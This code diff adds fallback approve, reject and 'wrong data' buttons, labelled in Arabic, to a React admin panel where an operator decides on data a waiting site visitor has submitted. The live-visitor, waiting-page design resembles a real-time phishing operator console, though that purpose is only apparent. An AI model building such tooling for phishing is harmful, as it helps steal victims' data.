@@ -375,6 +375,27 @@ const UserDetailsPanel = ({ user, onClose, onDelete }: UserDetailsPanelProps) =>
               );
             })}
           </div>
+
+          {/* Fallback action buttons: visitor is waiting but no section is mapped
+              (e.g. arrived on a page without submitting any data yet, or sitting on the waiting page) */}
+          {isWaiting && (filledSections.length === 0 || actionSectionKey === null) && (
+            <div className="mt-3 border-2 border-dashed border-amber-400 bg-amber-50/50 rounded-xl p-3">
+              <p className="text-[11px] font-bold text-amber-800 mb-2 text-center">
+                ⏳ الزائر في انتظار قرارك ({liveUser.last_page || "—"})
+              </p>
+              <div className="grid grid-cols-2 gap-1.5">
+                <Button size="sm" className="border-2 border-green-500 bg-green-500/10 text-green-700 hover:bg-green-500/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("موافقة")}>
+                  {sending === "موافقة" ? "..." : "✅ موافقة"}
+                </Button>
+                <Button size="sm" className="border-2 border-red-500 bg-red-500/10 text-red-700 hover:bg-red-500/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("رفض")}>
+                  {sending === "رفض" ? "..." : "❌ رفض"}
+                </Button>
+                <Button size="sm" className="col-span-2 border-2 border-destructive bg-destructive/10 text-destructive hover:bg-destructive/20 font-bold text-xs h-8" variant="outline" disabled={sending !== null} onClick={() => sendAction("بيانات خاطئة")}>
+                  {sending === "بيانات خاطئة" ? "..." : "⚠️ بيانات خاطئة"}
+                </Button>
+              </div>
+            </div>
+          )}
         </div>
 
         {/* Watch choice */}
